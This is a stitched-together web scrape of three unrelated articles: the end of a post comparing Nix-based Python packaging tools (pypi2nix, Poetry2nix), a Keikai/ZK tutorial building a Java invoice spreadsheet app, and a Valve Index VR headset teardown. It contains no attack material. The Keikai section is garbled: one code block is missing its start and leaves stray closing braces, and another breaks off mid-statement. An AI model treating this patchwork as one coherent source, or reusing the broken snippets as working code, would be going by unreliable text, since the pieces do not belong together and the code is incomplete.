This can of course be worked around with overlays and manual packaging, but this quickly becomes a daunting task.</li>
<li>In a team setting, every team member wanting to add packages needs to buy in to Nix and at least have some experience using and understanding Nix.</li>
</ol>
<p>All these factors lead us to a conclusion: we need to embrace Python tooling so we can efficiently work with the entire Python ecosystem.</p>
<h3>Pip and Pypi2Nix</h3>
<p>The second standard method tries to overcome the faults above by using a hybrid approach of Python tooling together with Nix code generation.
Instead of writing dependencies manually in Nix, they are extracted from the <code>requirements.txt</code> file that users of Pip and Virtualenv are very used to.
That is, from a <code>requirements.txt</code> file containing the necessary dependencies:</p>

<p>we can use <a href="https://github.com/nix-community/pypi2nix">pypi2nix</a> to package our application in a more automatic fashion than before:</p>
<div data-language="sh"><pre><code>nix-shell -p pypi2nix --run "pypi2nix -r requirements.txt"</code></pre></div>
<p>However, Pip is not a dependency manager and therefore the <code>requirements.txt</code> file is not explicit enough — it lacks both exact versions for libraries, and system dependencies.
Therefore, the command above will not produce a working Nix expression.
In order to make pypi2nix work correctly, one has to manually find all dependencies incurred by the use of Pillow:</p>
<div data-language="sh"><pre><code>nix-shell -p pypi2nix --run "pypi2nix -V 3.8 -E pkgconfig -E freetype -E libjpeg -E openjpeg -E zlib -E libtiff -E libwebp -E tcl -E lcms2 -E xorg.libxcb -r requirements.txt"</code></pre></div>
<p>This will generate a large Nix expression, that will indeed work as expected.
Further use of Pypi2nix is left to the reader, but we can already draw some conclusions about this approach:</p>
<ol>
<li>Code generation results in huge Nix expressions that can be hard to debug and understand.
These expressions will typically be checked into a project repository, and can get out of sync with actual dependencies.</li>
<li>It’s very high friction, especially around native dependencies.</li>
</ol>
<p>Having many large Python projects, I wasn’t satisfied with the status quo around Python package management.
So I looked into what could be done to make the situation better, and which tools could be more appropriate for our use-case.
A potential candidate was <a href="https://github.com/pypa/pipenv">Pipenv</a>, however its dependency
solver and lock file format were difficult to work with.
In particular, Pipenv’s detection of “local” vs “non-local” dependencies did not work properly inside the Nix shell and gave us the wrong dependency graph.
Eventually, I found <a href="https://python-poetry.org/">Poetry</a> and it looked very promising.</p>
<h2>Poetry and Poetry2nix</h2>
<p>The <a href="https://python-poetry.org/docs/">Poetry package manager</a> is a relatively recent addition to the Python ecosystem but it is gaining popularity very quickly.
Poetry features a nice CLI with good UX and deterministic builds through lock files.</p>
<p>Poetry uses <code>pip</code> under the hood and, for this reason, inherited some of its shortcomings and lock file design.
I managed to land a few patches in Poetry before the 1.0 release to improve the lock file format, and now it is fit for use in Nix builds.
The result was <a href="https://github.com/nix-community/poetry2nix">Poetry2nix</a>, whose key design goals were:</p>
<ol>
<li>Dead simple API.</li>
<li>Work with the entire Python ecosystem using regular Python tooling.</li>
<li>Python developers should not have to be Nix experts, and vice versa.</li>
<li>Being an expert should allow you to “drop down” into the lower levels of the build and customise it.</li>
</ol>
<p>Poetry2nix is not a code generation tool — it is implemented in pure Nix.
This fixes many of problems outlined in previous paragraphs, since there is a single point of truth for dependencies and their versions.</p>
<p>But what about our native dependencies from before?
How does Poetry2nix know about those?
Indeed, Poetry2nix comes with an extensive set of overrides built-in for a lot of common packages, including Pillow.
Users are encouraged to contribute overrides <a href="https://github.com/nix-community/poetry2nix/blob/master/overrides.nix">upstream</a> for popular packages, so everyone can have a better user experience.</p>
<p>Now, let’s see how Poetry2nix works in practice.</p>
<h3>Developing with Poetry</h3>
<p>Let’s start with only our application file above (<code>imgapp/__init__.py</code>) and a <code>shell.nix</code>:</p>
<div data-language="nix"><pre><code><span>{</span> pkgs <span>?</span> <span>import</span> <span>&lt;</span>nixpkgs<span>&gt;</span> <span>{</span><span>}</span> <span>}</span><span>:</span>

pkgs<span>.</span>mkShell <span>{</span>

  buildInputs <span>=</span> <span>[</span>
    pkgs<span>.</span>python3
    pkgs<span>.</span>poetry
  <span>]</span><span>;</span>

<span>}</span></code></pre></div>
<p>Poetry comes with some nice helpers to create a project, so we run:</p>

<p>And then we’ll add our dependencies:</p>
<div data-language="sh"><pre><code>$ poetry add requests pillow flask</code></pre></div>
<p>We now have two files in the folder:</p>
<ul>
<li>The first one is <code>pyproject.toml</code> which not only specifies our dependencies but also replaces <code>setup.py</code>.</li>
<li>The second is <code>poetry.lock</code> which contains our entire pinned Python dependency graph.</li>
</ul>
<p>For Nix to know which scripts to install in the <code>bin/</code> output directory, we also need to add a <code>scripts</code> section to <code>pyproject.toml</code>:</p>
<div data-language="toml"><pre><code><span>[</span><span>tool.poetry</span><span>]</span>
<span>name</span> <span>=</span> <span>"imgapp"</span>
<span>version</span> <span>=</span> <span>"0.1.0"</span>
<span>description</span> <span>=</span> <span>""</span>
<span>authors</span> <span>=</span> <span>[</span><span>"adisbladis &lt;<a href="https://www.tweag.io/cdn-cgi/l/email-protection" data-cfemail="fb9a9f928899979a9f9288bb9c969a9297d5989496">[email&nbsp;protected]</a>&gt;"</span><span>]</span>

<span>[</span><span>build-system</span><span>]</span>
<span>requires</span> <span>=</span> <span>[</span><span>"poetry&gt;=0.12"</span><span>]</span>
<span>build-backend</span> <span>=</span> <span>"poetry.masonry.api"</span></code></pre></div>
<h3>Packaging with Poetry2nix</h3>
<p>Since Poetry2nix is not a code generation tool but implemented entirely in Nix, this step is trivial.
Create a <code>default.nix</code> containing:</p>
<div data-language="nix"><pre><code><span>{</span> pkgs <span>?</span> <span>import</span> <span>&lt;</span>nixpkgs<span>&gt;</span> <span>{</span><span>}</span> <span>}</span><span>:</span>
pkgs<span>.</span>poetry2nix<span>.</span>mkPoetryApplication <span>{</span>
  projectDir <span>=</span> <span>./.</span><span>;</span>
<span>}</span></code></pre></div>
<p>We can now invoke <code>nix-build</code> to build our package defined in <code>default.nix</code>.
Poetry2nix will automatically infer package names, dependencies, meta attributes and more from the Poetry metadata.</p>
<h3>Manipulating overrides</h3>
<p>Many overrides for system dependencies are already upstream, but what if some are lacking?
These overrides can be manipulated and extended manually:</p>
<div data-language="nix"><pre><code>poetry2nix<span>.</span>mkPoetryApplication <span>{</span>
    projectDir <span>=</span> <span>./.</span><span>;</span>
    overrides <span>=</span> poetry2nix<span>.</span>overrides<span>.</span>withDefaults <span>(</span>self<span>:</span> super<span>:</span> <span>{</span>
      foo <span>=</span> foo<span>.</span>overridePythonAttrs<span>(</span>oldAttrs<span>:</span> <span>{</span><span>}</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<h2>Conclusion</h2>
<p>By embracing both modern Python package management tooling and the Nix language, we can achieve best-in-class user experience for Python developers and Nix developers alike.</p>
<p>There are ongoing efforts to make Poetry2nix and other Nix Python tooling work better with data science packages like <code>numpy</code> and <code>scipy</code>.
I believe that Nix may soon rival Conda on Linux and MacOS for data science.</p>
<p>Python + Nix has a bright future ahead of it!</p></div></div></div></section></div>]]>

    <div><p>After helping my colleague in the administration department turning her Excel file into a <a href="https://dzone.com/articles/turn-you-excel-file-into-a-web-application">Buy Currency Web App</a>, I now have the chance to help my colleague in the sales department by automating their invoice-generating process. In this article, I will share with you how I did it.</p>



<p>For salespersons, it is very common to create an invoice with Excel. But the process usually involves many error-prone manual actions like inputting data, copy/pasting,... etc. My colleague, like any salesperson, wishes that the data can be populated from the database into the invoice Excel template automatically, instead of having to input it manually. Therefore I took the time and created a web application, <strong>Invoice Builder</strong>, and turned such a manual process into an integrated, automated process leveraging Excel files, Java and, <a href="https://keikai.io/">Keikai</a>.</p>

<p>Here is a short clip of usage:</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/usage-demo.gif" alt=""></p>



<p>The image below shows the architecture of invoice builder application:</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/architecture.jpg" alt=""></p>

<ul>
<li>Initially, I import a source Excel file that has 2 empty tables -- the customer table and product table. A salesman will select customers and products from these tables.</li>
<li>Customer and product data is populated into the corresponding tables based on database queries.</li>
<li>We also import 2 invoice templates; they are created in Excel by our salesman. These templates will be used later.</li>
<li>Workflow: after selecting customers and products, the app will create invoices by combining customer and product data with the selected invoice template.</li>
</ul>



<p>The first step is to build the UI for this app. Since our salesman is used to work with Excel templates, we use Keikai Spreadsheet here so that he can continue using his existing templates. To give you a quick background, Keikai is based on <a href="http://www.zkoss.org/">ZK UI framework</a> which provides a complete set of UI components, and an XML-formatted UI language, <a href="https://www.zkoss.org/wiki/ZUML_Reference"><strong>ZUL</strong></a>. Following ZK's syntax, I build this web application's UI with the following UI components in XML tags:</p>
<div><pre><code data-lang="xml"><span>&lt;hlayout</span> <span>vflex=</span><span>"1"</span> <span>width=</span><span>"100%"</span> <span>apply=</span><span>"io.keikai.devref.usecase.invoice.InvoiceBuilderController"</span><span>&gt;</span>
    <span>&lt;spreadsheet</span> <span>height=</span><span>"100%"</span> <span>id=</span><span>"spreadsheet"</span> <span>hflex=</span><span>"8"</span>
                <span>maxVisibleRows=</span><span>"6"</span> <span>maxVisibleColumns=</span><span>"8"</span>
                <span>src=</span><span>"/WEB-INF/books/invoice-source.xlsx"</span>
                <span>showSheetbar=</span><span>"true"</span><span>/&gt;</span>
    <span>&lt;vlayout</span> <span>hflex=</span><span>"2"</span> <span>height=</span><span>"100%"</span><span>&gt;</span>
        <span>&lt;groupbox</span> <span>id=</span><span>"templateBox"</span> <span>title=</span><span>"Template"</span> <span>style=</span><span>"text-align: center"</span><span>&gt;</span>
        <span>&lt;/groupbox&gt;</span>
        <span>&lt;button</span> <span>id=</span><span>"create"</span> <span>label=</span><span>"Create"</span> <span>style=</span><span>"float: right"</span><span>/&gt;</span>
    <span>&lt;/vlayout&gt;</span>
<span>&lt;/hlayout&gt;</span>
</code></pre></div>
<ul>
<li><code>&lt;spreadsheet&gt;</code>: keikai spreadsheet.</li>
<li><a href="https://www.zkoss.org/zkdemo/getting_started/layout"><code>&lt;hlayout&gt;</code></a>: It layouts its child components horizontally in a row, and <code>&lt;vlayout&gt;</code> layouts components vertically.</li>
<li><a href="https://www.zkoss.org/zkdemo/layout/group_box"><code>&lt;groupbox&gt;</code></a>: It groups components with a border and a title.</li>
</ul>

<p>Each tag supports some attributes, for example:</p>

<ul>
<li><code>src</code>: specify an Excel file path to be imported into Keikai.</li>
<li><code>maxVisibleRows</code>: controls the maximum visible rows when keikai renders a sheet in a browser.</li>
</ul>

<p>For the complete attribute list, please refer to <a href="https://doc.keikai.io/dev-ref/Control_Components#zul-attributes">Keikai Developer Reference</a> and <a href="http://books.zkoss.org/wiki/ZK_Component_Reference">ZK Component Reference</a>.</p>



<p>I am used to working with MVC and Keikai does support that. Let me explain each role under the context of Keikai:</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/mvc.jpg" alt=""></p>

<ul>
<li><strong>View</strong> : An XML file written in ZUL. ZK translates a zul file into UI components and renders in your browsers.</li>
<li><strong>Controller</strong>: A Java class that extends ZK <a href="https://www.zkoss.org/javadoc/latest/zk/org/zkoss/zk/ui/select/SelectorComposer.html"><code>SelectorComposer</code></a> that listens to events fired from View and control ZK UI components. It controls Keikai by <code>Spreadsheet</code> and <code>Range</code> API.</li>
<li><strong>Model</strong>: In my case, it's <code>CustomerService</code>, but it could be any of your java business classes, e.g. authentication, data query</li>
</ul>

<h2 id="specify-a-controller">Specify a Controller</h2>

<p>To specify a Controller for a page, I specify a full-qualified class name at <code>apply</code> attribute:</p>
<div><pre><code data-lang="xml"><span>&lt;hlayout</span> <span>vflex=</span><span>"1"</span> <span>width=</span><span>"100%"</span> <span>apply=</span><span>"io.keikai.devref.usecase.invoice.InvoiceBuilderController"</span><span>&gt;</span>
...
<span>&lt;/hlayout&gt;</span>
</code></pre></div>
<p>Then this controller can control <code>&lt;hlayout&gt;</code> and its child components. I usually specify a controller at the root component on a page.</p>



<p>Personally, I like to work with zul because it is easy to read. If you prefer to work with pure Java (like Swing) instead of using zul, it is also possible. You can create a component with <a href="https://www.zkoss.org/javadoc/latest/zk/org/zkoss/zul/Image.html"><code>new Image()</code></a>, add a component into a Groupbox (container) by <code>appendChild()</code>, and register an event listener with <code>addEventListener()</code>. With those API, you can dynamically create template preview images upon a template list array inside a groupbox:</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/preview-images.jpg" alt=""></p>
<div><pre><code data-lang="java"><span>@Wire</span>
<span>private</span> <span>Groupbox</span> <span>templateBox</span><span>;</span>
<span>private</span> <span>String</span><span>[]</span> <span>templateFileNameList</span> <span>=</span> <span>{</span><span>"invoice-template1.xlsx"</span><span>,</span> <span>"invoice-template2.xlsx"</span><span>};</span>
<span>...</span>
<span>private</span> <span>void</span> <span>buildTemplatePreview</span><span>()</span> <span>{</span>
    <span>...</span>
    <span>Arrays</span><span>.</span><span>stream</span><span>(</span><span>templateFileNameList</span><span>).</span><span>forEach</span><span>(</span><span>fileName</span> <span>-&gt;</span> <span>{</span>

        <span>templateBox</span><span>.</span><span>appendChild</span><span>(</span><span>preview</span><span>);</span>
        <span>preview</span><span>.</span><span>setAttribute</span><span>(</span><span>TEMPLATE_KEY</span><span>,</span> <span>fileName</span><span>);</span>
        <span>preview</span><span>.</span><span>addEventListener</span><span>(</span><span>org</span><span>.</span><span>zkoss</span><span>.</span><span>zk</span><span>.</span><span>ui</span><span>.</span><span>event</span><span>.</span><span>Events</span><span>.</span><span>ON_CLICK</span><span>,</span> <span>event</span> <span>-&gt;</span>
                <span>selectTemplate</span><span>((</span><span>Image</span><span>)</span> <span>event</span><span>.</span><span>getTarget</span><span>()));</span>
        <span>...</span>
    <span>});</span>
    <span>...</span>
<span>}</span>
</code></pre></div>


<p>Now that we can display the spreadsheet and the source file, we need to populate data into the table.</p>

<p>The source Excel file just contains an empty customer table with table styles like column names and header colors. One good thing here is that this Excel file is created by my salesperson using Excel -- he knows better what he wants to see in this table.</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/customer-table.jpg" alt=""></p>

<p>I load customer list from a service class and populate the list into the table:</p>
<div><pre><code data-lang="java"><span>private</span> <span>void</span> <span>populateCustomers</span><span>()</span> <span>{</span>
    <span>List</span><span>&lt;</span><span>String</span><span>[]&gt;</span> <span>customers</span> <span>=</span> <span>CustomerService</span><span>.</span><span>getCustomerList</span><span>();</span>
    <span>Range</span> <span>startingCell</span> <span>=</span> <span>customerTable</span><span>.</span><span>toCellRange</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>);</span> <span>//the 1st column is for checkbox</span>
    <span>for</span> <span>(</span><span>String</span><span>[]</span> <span>c</span> <span>:</span> <span>customers</span><span>)</span> <span>{</span>
        <span>RangeHelper</span><span>.</span><span>setValuesInRow</span><span>(</span><span>startingCell</span><span>,</span> <span>c</span><span>);</span>
        <span>startingCell</span> <span>=</span> <span>startingCell</span><span>.</span><span>toShiftedRange</span><span>(</span><span>1</span><span>,</span> <span>0</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<ul>
<li><code>CustomerService</code> could also be any Java class that provides data entities in your case.</li>
<li><code>setValuesInRow()</code> fills multiple cells one by one in a row with an array of string, e.g. B2, C2, D2...</li>
<li><a href="https://keikai.io/javadoc/latest/io/keikai/api/Range.html#toShiftedRange-int-int-"><code>toShiftedRange(1, 0)</code></a> shifts <code>startingCell</code> to the next row.</li>
</ul>



<p>When populating data to the spreadsheet UI, we need to specify the target cells that we wish to populate the data into. I go with Named Ranges as it is a flexible way. It works like a <strong>place holder</strong> in this application. Firstly, I create several named ranges in each template file e.g. <code>Name</code>, <code>Phone</code>, and <code>Email</code> for customer details. After an end-user selects customers and products, the controller extracts each row as a map. The key is header value, the value is the corresponding cell value, e.g. <code>{Name: Debra, Phone: 338-8777, Email: debra@yahoo.com...}</code>. Then I clone an invoice sheet from the selected template and populate customer details into the corresponding named ranges.</p>

        <span>}</span>
    <span>});</span>
<span>}</span>
</code></pre></div>


<p>In this app, customer data is populated from the database, and we don't want our salespersons to change them. They should only select these records. Therefore, I limit what they can do on the UI in the following ways:</p>

<h2 id="hide-toolbar-and-context-menu">Hide Toolbar and Context Menu</h2>

<p>I make the sheet tab visible by specifying <code>showSheetbar="true"</code>. Everything else like the toolbar, formula bar, and the context menu is invisible by default. With this, users won't accidentally change what's displayed on the UI.</p>
<div><pre><code data-lang="xml"><span>&lt;spreadsheet</span> <span>...</span> <span>showSheetbar=</span><span>"true"</span><span>/&gt;</span>
</code></pre></div>
<h2 id="enable-sheet-protection-amp-disable-adding-a-sheet">Enable Sheet Protection &amp; Disable Adding a Sheet</h2>

<p>Then, I also enable sheet protection by <code>protectSheet()</code> to make all sheets read-only and forbid users adding a sheet by <code>disableUserAction()</code>.</p>
<div><pre><code data-lang="java"><span>private</span> <span>void</span> <span>limitAccess</span><span>()</span> <span>{</span>
    <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spreadsheet</span><span>.</span><span>getBook</span><span>().</span><span>getNumberOfSheets</span><span>();</span> <span>i</span><span>++)</span> <span>{</span>
        <span>Ranges</span><span>.</span><span>range</span><span>(</span><span>spreadsheet</span><span>.</span><span>getBook</span><span>().</span><span>getSheetAt</span><span>(</span><span>i</span><span>)).</span><span>protectSheet</span><span>(</span><span>SELECTION_FILTER</span><span>);</span>
    <span>}</span>
    <span>spreadsheet</span><span>.</span><span>disableUserAction</span><span>(</span><span>AuxAction</span><span>.</span><span>ADD_SHEET</span><span>,</span> <span>true</span><span>);</span>
<span>}</span>
</code></pre></div>
<h2 id="editable-area-under-sheet-protection">Editable Area under Sheet Protection</h2>

<p>In Excel, you can uncheck <strong>locked</strong> status to make a cell editable under sheet protection. Other cells will remain read-only. With this setting, you can allow a range of editable area in a protected sheet. This setting will stay after importing to Keikai, so this can be done from the Excel side when we prepare the source files.</p>

<p><img src="https://keikai.io/blog/images/2020-08-invoice/unchecked-locked.jpg" alt=""></p>



<p>In this app, I have 2 Excel templates and I want to import them once and then use them whenever needed. </p>

<p>Keikai <a href="https://keikai.io/javadoc/latest/io/keikai/api/Importer.html"><code>Importer</code></a> converts an Excel xlsx file into a <a href="https://keikai.io/javadoc/latest/io/keikai/api/model/Book.html"><code>Book</code></a>. You can assign the <code>Book</code> to <a href="https://keikai.io/javadoc/latest/io/keikai/ui/Spreadsheet.html"><code>Spreadsheet</code></a> and render it to a browser. Alternatively, you can manipulate a <code>Book</code> with <a href="https://keikai.io/javadoc/latest/io/keikai/api/Range.html"><code>Range</code></a> directly without assigning it to a <code>Spreadsheet</code>. The most-commonly usages are to clone sheets or copy cells from a template book. Everyone who needs the Excel template can grab content from them without importing the template file again.</p>

<p>In my application, I store the <code>Book</code> objects of 2 template Excel files in a <code>Map</code> (<code>templateWarehouse</code>) for future use:</p>
<div><pre><code data-lang="java"><span>private</span> <span>static</span> <span>HashMap</span><span>&lt;</span><span>String</span><span>,</span> <span>Book</span><span>&gt;</span> <span>templateWarehouse</span> <span>=</span> <span>new</span> <span>HashMap</span><span>&lt;&gt;();</span>
<span>private</span> <span>static</span> <span>Importer</span> <span>importer</span> <span>=</span> <span>Importers</span><span>.</span><span>getImporter</span><span>();</span>
<span>...</span>
<span>private</span> <span>void</span> <span>importInvoiceTemplate</span><span>()</span> <span>{</span>
    <span>...</span>
        <span>for</span> <span>(</span><span>String</span> <span>fileName</span> <span>:</span> <span>templateFileNameList</span><span>)</span> <span>{</span>
            <span>if</span> <span>(!</span><span>templateWarehouse</span><span>.</span><span>containsKey</span><span>(</span><span>fileName</span><span>))</span> <span>{</span> <span>//avoid importing again</span>
                <span>templateWarehouse</span><span>.</span><span>put</span><span>(</span><span>fileName</span>
        …</code></pre></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>If you have ever wondered what is inside Valve Index, you might have stumbled upon my <a href="https://www.reddit.com/r/ValveIndex/comments/cpayc5/valve_index_disassembly/">reddit post from 2019</a>. I’ve decided to dive into the details of what makes Valve Index great and share my thoughts on tech inside.</p>

<p>Teardown should begin from the simplest parts - remove the face mask (held by just magnets), unplug the main cable, and remove headphones that are held in place by a single screw each. Next remove the rubber cover that is glued around lenses. It’s not that well glued, you can just pull it off.</p>

<p><img src="https://www.thevrist.com/assets/images/index1.jpg" alt="">
<em>Rubber cover that prevents dust from getting inside lenses</em></p>

<p>Let’s start with a front panel - glossy front panel is removed by hand, since it is only held by magnets (but you already knew that from all the numerous pictures of people shoving stuff in the frunk of the headset). The rest of the front panel can be easily split in two parts. First is the frunk section, it will give you access to the main circuit board of the headset. You can remove it quite painlessly if you have the correct screwdriver. This panel does not contain any electronics.</p>

<p><img src="https://www.thevrist.com/assets/images/index-face.jpg" alt="">
<em>Just look at this beauty</em></p>

<p>Second part of the front panel is more complex. It contains tracking points for the SteamVR tracking - you can see them by looking at the plastic at different angles - plastic covering tracking points is thinner so laser beams from base stations could shoot through it. SteamVR trackers are split in two independent parts, which are connected to the main circuit separately. Also this panel contains two front facing cameras, which makes the process of taking it off even more delicate. You have to disconnect two cameras and two halves of the tracking plate’s system to finally fully reveal the main circuit.</p>

<h2 id="main-circuit">Main Circuit</h2>

<p><img src="https://www.thevrist.com/assets/images/index2.jpg" alt="">
<em>The “meat” of Valve Index</em></p>

<p>Finally we get to the main computing power of the headset. You can identify the main points of the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index3-1.png" alt="">
<em>This is where all the cables connect to the HMD</em></p>

<p>On the top there is a metal connector with FPC cable going in. It is going to the smaller circuit in the top part of the headset where the cable plugs in the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index4.jpg" alt="">
<em>Circuit board with main cable and 3.5 mm audio port. It also connects to the proximity sensor</em></p>

<p>Same circuit has a 3.5 mm audio port for connecting headphones (I bet you didn’t know there is an audio jack) and proximity sensor between lenses. Last one is used for turning off the screens when the headset is not on the head.</p>

<p><img src="https://www.thevrist.com/assets/images/index2-1.png" alt="">
<em>SteamVR tracking points are connected here</em></p>

<p>On the sides of the main circuit board there are two black FPC cables. Those are going to the SteamVR tracking dots located in the sides of the headsets. Here is a picture of the tracking “web” when taken out of the headset.</p>

<p><img src="https://www.thevrist.com/assets/images/index5.jpg" alt="">
<em>One side of SteamVR tracking web taken out of the HMD</em></p>

<p>Final two FPC cables are orange color and located at the bottom of the main board. They are connecting to a pair of displays located right behind this circuit.</p>

<h2 id="microchips">Microchips</h2>

<p>Now it is time to dive in a wonderful world of microchips and circuit boards. I want to thank <a href="https://www.linkedin.com/in/popovs/">Sergejs Popovs</a> for helping to identify most of the components on the board.</p>

<p>Let’s start with simple chips. Here are two bluetooth <a href="https://www.nordicsemi.com/Products/Low-power-short-range-wireless/nRF52840">chips from Nordic Semiconductors</a>. Each of these chips is used for connecting one controller with the headset. That’s why there is a limitation of two devices connected to the HMD. If you want to connect more devices (Vive Trackers or other controllers) you will need to use a USB dongle with a separate Bluetooth chip.</p>

<em>Bluetooth microchips, each connects to one device</em></p>

<p>Do you remember the USB port in the frunk? Well, this is a <a href="http://ww1.microchip.com/downloads/en/DeviceDoc/USB5744-Data-Sheet-DS00001855J.pdf">chip from Microchip</a> for that USB port - hence USB in the name.</p>

<p><img src="https://www.thevrist.com/assets/images/index4-4.jpg" alt="">
<em>USB chip for USB port next to it</em></p>

<p>Here is a <a href="https://www.via-labs.com/product_show.php?id=96">chip from Via-Labs</a>. It has a purpose of converting USB 3.1 signal to the 2.0 one. Some of the chips on the circuit are not advanced enough to understand 3.1 USB, so this chip “dumbs it down”. When the signal will need to go back to the PC, the chip will convert the signal back to the USB 3.1.</p>

<p><img src="https://www.thevrist.com/assets/images/index8.jpg" alt="">
<em>USB signal converter chip</em></p>

<p>This is a flash memory chip from <a href="https://www.digikey.com/products/en/integrated-circuits-ics/memory/774?k=w25q32jw">Winbond Electronics</a>.</p>

<p><img src="https://www.thevrist.com/assets/images/index9.jpg" alt="">
<em>Flash memory can be used for different kinds of tasks</em></p>

<p>Next are these two microchips. The smaller one is a <a href="https://www.analogix.com/en/products/dp-mipi-converters/anx7530">SlimPort® 4K receiver from Analogix</a>. It is capable of receiving Image in 4K at 60 Hz, but since screens in Valve Index are only 1440 by 1600 pixels it allows to process video at 90, 120, and even 144 Hz. It also splits the signal in two allowing each display to get its own image.</p>

<p><img src="https://www.thevrist.com/assets/images/index10.jpg" alt="">
<em>Video chips convert image that you see in your SteamVR mirror in beautiful VR image</em></p>

<p>Larger chip is a multipurpose <a href="https://www.digikey.com/products/en/integrated-circuits-ics/embedded-fpgas-field-programmable-gate-array/696?k=ICE40HX8K">FPGA (Field Programmable Gate Array) chip from Lattice Semiconductor</a>. It is used for tracking - all the data received from the tracking sensors is gathered here. This chip combined with the <a href="http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11289-32-bit-Cortex-M4-Microcontroller-SAM-G55_Summary-Datasheet.pdf">Atmel MCU</a> (located on the other side of the circuit board) are doing all the necessary tracking calculations.</p>

<p><a href="http://www.etron.com.tw/cn/products/webcam_detial.php?Product_ID=10">EtronTech microchip</a> is used for merging video feeds from external cameras and transmitting it to your PC.</p>

<p><img src="https://www.thevrist.com/assets/images/index11.jpg" alt="">
<em>Microchip for processing image from webcams</em></p>

<p>Last two chips on this side of the circuit from <a href="https://www.silabs.com/power/efp01-power-management-ic">SiliconLabs</a> are most likely related to power regulation. Both of them are located near the capacitors and an inductor (metal thingy with 150 written on it). These are making sure that nothing will get too hot on your face.</p>

<p><img src="https://www.thevrist.com/assets/images/index12.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index13.jpg" alt="">
<em>Power regulating microchips</em></p>

<p>Next step is to remove the main circuit board and look on its other side. Other side is less interesting and has very little information to offer. Most parts are related to the power regulation mentioned in the previous paragraph.</p>

<p><img src="https://www.thevrist.com/assets/images/index14.jpg" alt="">
<em>Back side of the main circuit board</em></p>

<p>Largest chip is an Atmel MCU, which I’ve already mentioned is related to the tracking system. On the left from it is a <a href="https://www.nxp.com/docs/en/data-sheet/LPC11U1X.pdf">microcontroller from NXP</a>. These are all the chips we managed to identify. One chip that is missing, is the additional Bluetooth module. Unlike Vive and Vive Pro, Index has bluetooth in the headset. It is used for connecting to the base stations, updating base station firmware, and sending them to sleep mode when the headset is turning off. Last one is completely optional - I prefer to keep my base stations 2.0 on all the time.</p>

<p><img src="https://www.thevrist.com/assets/images/index14-2.jpg" alt="">
<em>The only two chips worth noting on this side of the motherboard - larger one is for tracking calculations</em></p>

<p>Why there is no separate Bluetooth chip for this purpose is still a mystery for me. Only possible explanation is that two Bluetooth chips for controllers are capable of switching to different modes and control the base stations.</p>

<h2 id="screens">Screens</h2>

<p>After the circuit is removed you will reveal several key components. First - you can see two displays - quick search shows that those panels are made by BOE Technology - Chinese display manufacturer. Those are 1440×1600, 615PPI 3.5” <a href="https://www.panelook.com/VS035ZSM-NW0-69P0_BOE_3.5_LCM_overview_37926.html">panels</a>.</p>

<p><img src="https://www.thevrist.com/assets/images/index15.jpg" alt="">
<em>View of the HMD with main board removed</em></p>

<p>Note some key elements in this view. On the bottom there is a circular mechanism with a metal pin with springs going through the whole headset. Similar pin is barely visible on the top of the headset. This is an IPD adjustment system - movement of the knob at the bottom of the HMD will rotate circular element in the bottom center which will push screens apart.
On the left and right sides of HMD you can see black gears - this is a system for eye relief - rotating a knob on the side of the headset will move the facemask relatively to the screens. Gear system is making sure both sides are rotating simultaneously, without giving too much pressure to the mechanism.</p>

<p><img src="https://www.thevrist.com/assets/images/index16.jpg" alt="">
<em>IPD knob is actually a screw</em></p>

<p>In order to take the central part out from the headset, you will need to take the cap off the IPD adjustment knob and unscrew it.</p>

<p><img src="https://www.thevrist.com/assets/images/index17.jpg" alt="">
<em>Lens chambers with IPD mechanism still attached</em></p>

<p>Next was what I call the “wondering in the dark” part of teardown - for about 30 minutes we were trying to find a way of taking it apart without breaking anything, eventually using force to break one gear inside that was holding display chambers in place.</p>

<p><img src="https://www.thevrist.com/assets/images/index18.jpg" alt="">
<em>Right eye lens chamber removed</em></p>

<p>After this step you can easily take off separate lens chambers and view the details. Chambers are sealed shut so nothing will get inside - they are assembled in perfectly clean conditions with no dust particles. 
In order to take it apart you can probably try to melt glue or something like that. But we are no iFixit, we used good ol’ force. Here you can see the screen separated from the chamber.</p>

<p><img src="https://www.thevrist.com/assets/images/index19.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index20.jpg" alt="">
<em>BOE screen removed from the chamber</em></p>

<p>Screen has a polarised diffuser glued to it, which is particularly difficult to remove. It is made of very thin crystal glass and it cracks easily. You can see that the corners of it are cracked.</p>

<p><img src="https://www.thevrist.com/assets/images/index21.jpg" alt="">
<em>Crystal polarisation diffuser</em></p>

<p>Diffuser is added to blend pixels better, making the screen door effect even lower.</p>

<p><img src="https://www.thevrist.com/assets/images/index22.jpg" alt="">
<em>Fancy multilayered lens</em></p>

<p>Finally - the lenses. I was expecting them to be thicker with the effect that they create. Valve are saying “The custom lenses built into the Valve Index Headset maximize field of view without sacrificing edge-to-edge clarity. High geometric stability allows you to look around the scene by moving your eyes (not just your head) with minimal shape distortion”. I tend to agree that these are the most advanced lenses in modern mass produced HMD, even though they have their own flaws. Main issue is the light spill when using a headset, you can see the bright light’s reflections in spots where they shouldn’t be.</p>

<h2 id="final-thoughts">Final thoughts</h2>

<p>As you can clearly see, it is not possible to replace a damaged screen or scratched lens all by yourself (even though for latter one you might try to take the lens out using a suction cup, however I don’t think that is a good idea, as lenses and screens are calibrated in the factory).</p>

<p><img src="https://www.thevrist.com/assets/images/index-end.jpg" alt="">
<em>Sometimes… I feel like a monster…</em></p>

<p>I am going to put the high-resolution images of the teardown and of the motherboard <a href="https://photos.app.goo.gl/dhuPVWTu6P5XWo4HA">here</a> so you can see and check all the details by yourself.

